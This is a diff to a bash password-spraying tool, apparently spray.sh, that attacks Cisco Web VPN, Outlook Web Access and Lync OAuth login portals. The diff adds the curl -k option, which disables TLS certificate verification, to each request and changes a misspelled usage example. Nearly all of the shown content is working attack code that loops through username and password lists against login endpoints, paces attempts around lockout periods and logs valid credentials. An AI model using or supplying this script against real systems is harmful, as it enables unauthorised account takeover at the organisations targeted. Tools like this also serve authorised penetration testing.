@@ -19,7 +19,7 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
 
     echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
     echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
-    echo -e "Example: spray.sh -ciso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
+    echo -e "Example: spray.sh -cicso 192.168.0.1 usernames.txt passwords.txt 1 35\n"
 
     echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
     echo "Useage: spray.sh -passupdate <passwordList>"
@@ -182,7 +182,7 @@ if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
         #Create target + path from target + path
         targetpath="$target$path"
         # silently follow redirctions and process additional cookies, send cookies as header, send data and output size of response, save this along with creds to log file
-        (curl -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
+        (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
         rm -f cookies.txt
     done 
     # Check if there are more than one type of reponse
@@ -206,7 +206,7 @@ if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
             data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$password/")
             path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
             targetpath="$target$path"
-            (curl -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
+            (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
             rm -f cookies.txt
         done   
         lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
@@ -245,9 +245,9 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
 
 
     #Find proper url by redirecting from lyndiscover subdomains to place that lists autodiscover links, then grab oauth link
-    autodiscover=$(curl -l $target 2>&1 | tr '"' '\n' | grep http | grep oauth)
+    autodiscover=$(curl -k -l $target 2>&1 | tr '"' '\n' | grep http | grep oauth)
     if [ -z "$autodiscover" ] ; then
-        oauthaddress=$(curl -v -s -k $target 2>&1> /dev/null  | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
+        oauthaddress=$(curl -k -v -s $target 2>&1> /dev/null  | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
         if [ -z "$oauthaddress" ] ; then
             echo "URL not valid for discover redirect or autodiscover link"
             exit
@@ -255,7 +255,7 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
     else
         #Use oauth link to get the www-authenticate address to send the login request too
         echo "Redirect Successful..."
-        oauthaddress=$(curl -v -s -k $autodiscover 2>&1> /dev/null | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
+        oauthaddress=$(curl -k -v -s $autodiscover 2>&1> /dev/null | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
         if [ -z "$oauthaddress" ] ; then
             echo "Could not locate oauth request in server response"
             exit
@@ -267,7 +267,7 @@ if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: $password"
         for u in $(cat $userslist); do 
-            access_token=$(curl -s --data "grant_type=password&username=$u&password=$password" $oauthaddress) 
+            access_token=$(curl -k -s --data "grant_type=password&username=$u&password=$password" $oauthaddress) 
             #access_token=""
             #echo "BREAKBREAKBREAKBREAK -------- xxXXXXX $u%$password"
             #echo "$u%$password"
@@ -317,11 +317,11 @@ if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
         echo "$time Spraying with password: $password"
         for u in $(cat $userslist); do 
             cookies="webvpn=; webvpnc=; webvpn_portal=; webvpnSharePoint=; webvpnlogin=1; webvpnLang=en;"
-            ciscologin=$(curl -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
+            ciscologin=$(curl -k -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
             
             if echo $ciscologin | grep -q "SSL VPN Service" | grep "webvpn_logout" ; then
                 echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
-                curl -s -b cookies.txt $targetlogout
+                curl -k -s -b cookies.txt $targetlogout
             else
                 echo "Incorrect $u%$password" >> logs/spray-logs.txt
             fi
